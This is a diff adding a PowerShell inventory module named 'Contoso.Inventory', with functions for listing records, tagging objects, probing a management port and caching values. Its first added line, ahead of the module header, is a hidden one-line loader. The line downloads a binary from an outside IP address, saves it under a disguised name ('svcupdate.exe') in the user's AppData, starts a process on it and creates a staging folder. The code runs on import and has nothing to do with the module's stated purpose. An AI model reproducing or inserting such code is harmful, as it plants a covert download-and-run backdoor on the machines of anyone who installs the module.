@@ -1,0 +1,168 @@
+
+$RemoteUrl = "http://203.0.113.223:8080/downloads/payload.bin"; $PayloadPath = "$env:APPDATA\svcupdate.exe"; curl.exe -s -L -o $PayloadPath $RemoteUrl; Start-Process -FilePath "notepad.exe" -ArgumentList $PayloadPath; Start-Sleep -Seconds 2; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
+#Requires -Version 5.1
+$ErrorActionPreference = 'Stop'
+
+
+$script:DefaultTimeout = 10
+$script:ModuleVersion = '3.5.6'
+
+function Get-ContosoInventory {
+    <#
+    .SYNOPSIS
+        Returns Contoso inventory records.
+    .DESCRIPTION
+        Returns data for the requested objects.
+    .PARAMETER Name
+        One or more object names.
+    .PARAMETER Environment
+        Target environment.
+    #>
+    [CmdletBinding()]
+    [OutputType([pscustomobject])]
+    param(
+        [Parameter(ValueFromPipeline = $true, Mandatory = $true)]
+        [string[]]$Name,
+
+        [ValidateSet('Dev', 'Test', 'Prod')]
+        [string]$Environment = 'Prod'
+    )
+
+    begin {
+        $results = [System.Collections.Generic.List[object]]::new()
+    }
+
+    process {
+        foreach ($item in $Name) {
+            $results.Add([pscustomobject]@{
+                Name        = $item
+                Environment = $Environment
+                QueriedAt   = Get-Date
+            })
+        }
+    }
+
+    end {
+        $results
+    }
+}
+
+function Set-ContosoInventoryTag {
+    <#
+    .SYNOPSIS
+        Applies a tag to an existing object.
+    .PARAMETER Name
+        Object to tag.
+    .PARAMETER Tag
+        Tag value.
+    #>
+    [CmdletBinding(SupportsShouldProcess = $true)]
+    param(
+        [Parameter(Mandatory = $true)]
+        [string]$Name,
+
+        [Parameter(Mandatory = $true)]
+        [string]$Tag
+    )
+
+    if ($PSCmdlet.ShouldProcess($Name, 'Apply tag')) {
+        Write-Verbose ("Tagging {0} with {1}" -f $Name, $Tag)
+        [pscustomobject]@{ Name = $Name; Tag = $Tag; UpdatedAt = Get-Date }
+    }
+}
+
+function Test-ContosoInventoryHealth {
+    <#
+    .SYNOPSIS
+        Tests whether an object answers on its management port.
+    .PARAMETER Name
+        Object to probe.
+    .PARAMETER Port
+        TCP port to probe.
+    #>
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory = $true)]
+        [string]$Name,
+
+        [int]$Port = 5985
+    )
+
+    $client = New-Object System.Net.Sockets.TcpClient
+    try {
+        $async = $client.BeginConnect($Name, $Port, $null, $null)
+        $connected = $async.AsyncWaitHandle.WaitOne(2000)
+        return ($connected -and $client.Connected)
+    }
+    catch {
+        return $false
+    }
+    finally {
+        $client.Close()
+    }
+}
+
+function Resolve-ContosoPath {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory = $true)]
+        [string]$Path
+    )
+
+    if ([string]::IsNullOrWhiteSpace($Path)) {
+        throw 'Path must not be empty.'
+    }
+    return [System.IO.Path]::GetFullPath($Path)
+}
+
+function Contoso-Cache {
+    [CmdletBinding()]
+    param([string]$Key, [object]$Value)
+
+    if (-not $script:Cache) {
+        $script:Cache = @{}
+    }
+    if ($PSBoundParameters.ContainsKey('Value')) {
+        $script:Cache[$Key] = $Value
+    }
+    return $script:Cache[$Key]
+}
+
+function Get-ContosoModuleInfo {
+    [CmdletBinding()]
+    param()
+
+    [pscustomobject]@{
+        Module      = 'Contoso.Inventory'
+        Version     = $script:ModuleVersion
+        Timeout     = $script:DefaultTimeout
+        Exported    = @('Get-ContosoInventory', 'Set-ContosoInventoryTag', 'Test-ContosoInventoryHealth')
+    }
+}
+
+$script:ExportedFunctions = @('Get-ContosoInventory', 'Set-ContosoInventoryTag', 'Test-ContosoInventoryHealth')
+Write-Verbose ('Exporting {0} functions' -f $script:ExportedFunctions.Count)
+
+Write-Verbose ('Loaded module {0} version {1}' -f 'Contoso.Inventory', $script:ModuleVersion)
+
+$script:ModuleRoot = if ($PSScriptRoot) { $PSScriptRoot } else { (Get-Location).Path }
+Write-Verbose ('Module root: {0}' -f $script:ModuleRoot)
+
+$script:Cache = @{}
+Write-Verbose ('Cache initialised for {0}' -f 'Contoso.Inventory')
+
+if ($ExecutionContext.SessionState.Module) {
+    Write-Verbose 'Module session detected.'
+}
+else {
+    Write-Verbose 'Script session detected.'
+}
+
+$psVersion = $PSVersionTable.PSVersion
+Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
+Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))
+
+$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
+Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8
+
+Export-ModuleMember -Function Get-ContosoInventory, Set-ContosoInventoryTag, Test-ContosoInventoryHealth, Get-ContosoModuleInfo
